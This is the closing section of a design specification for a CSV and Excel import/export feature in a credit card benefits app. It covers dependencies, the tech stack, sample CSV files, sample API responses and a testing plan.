- [x] Security considerations addressed (auth, validation, XSS, rate limiting)
- [x] Performance targets defined with query optimization strategy
- [x] Audit trail and compliance requirements documented

---

## Dependencies & Integration Notes

### Depends On (From Prior Phases)
- Authentication system (Phase 1) - READY
- Authorization checks (Phase 1) - READY
- Error handling framework (Phase 3) - READY
- Calculation utilities (ROI) (Phase 2) - READY
- Database schema (existing) - READY

### Integrates With
- Dashboard UI (display import/export buttons)
- Wallet management (add cards/benefits)
- Calculation system (validate fees/values)
- Error handling system (consistent error responses)
- Authentication system (verify ownership)

### Technology Stack

**File Processing:**
- CSV: papaparse (npm) - lightweight CSV parser
- XLSX: xlsx (npm) - popular Excel library
- Both: well-tested, widespread use

**Data Validation:**
- Existing: validation.ts functions
- New: importValidator.ts (specialized rules)

**Database:**
- Prisma (existing)
- SQLite (dev), PostgreSQL (prod)
- Transactions for atomicity

**UI Components:**
- React 19 (existing)
- shadcn/ui (existing)
- File input APIs (native browser)
- Download APIs (native browser)

---

## References & Examples

### Sample CSV File (Cards)
```csv
CardName,Issuer,AnnualFee,RenewalDate,CustomName,Status
Chase Sapphire Reserve,Chase,550,2024-12-31,My Amex,Active
American Express Gold,Amex,250,2025-06-15,,Active
Capital One Venture X,Capital One,395,2025-03-20,Venture X,Active
```

### Sample CSV File (Benefits)
```csv
CardName,Issuer,BenefitName,BenefitType,StickerValue,DeclaredValue,ExpirationDate,Usage
Chase Sapphire Reserve,Chase,Travel Credit,StatementCredit,300,300,2024-12-31,Claimed
Chase Sapphire Reserve,Chase,Dining Credit,StatementCredit,100,80,2024-12-31,Unused
American Express Gold,Amex,Dining Credits,StatementCredit,120,120,2025-06-15,Unused
```

### Sample API Responses

**Upload Success:**
```json
{
  "success": true,
  "importJobId": "imp_6h7k8j9l2m3n4p5q6r7s",
  "status": "Uploaded",
  "fileName": "cards_and_benefits.csv",
  "fileSize": 2048
}
```

**Validation Results:**
```json
{
  "success": true,
  "importJobId": "imp_6h7k8j9l2m3n4p5q6r7s",
  "summary": {
    "totalRecords": 10,
    "validRecords": 8,
    "warningRecords": 1,
    "errorRecords": 1
  },
  "records": [
    {
      "rowNumber": 1,
      "recordType": "Card",
      "status": "Valid",
      "data": { "cardName": "Chase Sapphire Reserve", ... }
    },
    {
      "rowNumber": 8,
      "recordType": "Benefit",
      "status": "Error",
      "errorDetails": ["RenewalDate must be in future"]
    }
  ]
}
```

---

## Appendix: Testing Strategy

### Unit Tests
- Validators: 40+ tests
- Parsers: 25+ tests
- Duplicate detectors: 30+ tests
- Committers: 35+ tests
- Export formatters: 30+ tests

### Integration Tests
- Full import workflow: 15+ tests
- Full export workflow: 10+ tests
- Round-trip (import → export → import): 5+ tests
- Error recovery: 10+ tests

### E2E Tests
- Upload → Validation → Preview → Commit flow
- Duplicate detection and resolution
- Export and download
- Error scenarios and recovery

### Test Data
- Small files: 5-50 records
- Medium files: 100-1000 records
- Large files: 5000-50000 records
- Edge case files: malformed, special characters, nulls

---

**Document Version:** 1.0
**Last Updated:** April 2, 2026
**Status:** Ready for Implementation
**Next Phase:** Task 1.1 - Create ImportJob and ImportRecord models
